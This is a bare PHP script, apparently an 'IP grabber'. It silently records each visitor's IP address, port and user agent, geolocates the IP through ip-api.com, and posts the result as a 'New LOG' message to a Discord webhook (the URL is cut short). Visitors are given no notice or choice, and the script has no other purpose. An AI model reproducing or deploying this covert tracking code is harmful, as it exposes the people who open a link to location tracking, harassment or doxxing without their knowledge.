<?php
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$location = file_get_contents("http://ip-api.com/json/{$ip}");
$locationData = json_decode($location);
$country = $locationData->country;
$region = $locationData->regionName;
$city = $locationData->city;
$message = "New LOG:\n";
$message .= "IP: " . $ip . "\n";
$message .= "Port: " . $port . "\n";
$message .= "User Agent: " . $userAgent . "\n";
$message .= "Location: " . $country . ", " . $region . ", " . $city . "\n";
$webhookUrl = "https://discord.com/api/webhooks/";
$data = array("content" => $message);
$options = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($webhookUrl, false, $context);
if ($result === false) {
} else {
}
?>